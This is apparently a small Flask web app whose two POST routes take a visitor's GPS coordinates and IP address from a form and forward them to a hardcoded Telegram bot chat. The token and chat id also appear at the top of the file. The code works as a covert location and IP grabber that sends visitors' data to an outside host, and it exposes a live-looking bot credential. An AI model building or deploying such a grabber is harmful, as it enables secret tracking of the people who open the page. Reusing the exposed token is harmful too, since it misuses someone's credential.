localipy
373715044
5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg



from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    latitude = request.form['latitude']
    longitude = request.form['longitude']
    
    # Send the location to Telegram using the Telegram Bot API
    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
    chat_id = '373715044'
    api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
    
    response = requests.get(api_url)
    if response.status_code == 200:
        return 'Location sent successfully!'
    else:
        return 'Failed to send location.'

@app.route('/send_ip', methods=['POST'])
def send_ip():
    # Get the IP address of the user
    ip_address = request.form['ip_address']
    
    # Send the IP address to Telegram using the Telegram Bot API
    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
    chat_id = '373715044'
    message = f"IP Address: {ip_address}"
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
    
    response = requests.get(api_url)
    if response.status_code == 200:
        return 'IP sent successfully!'
    else:
        return 'Failed to send IP.'

if __name__ == '__main__':
    app.run()
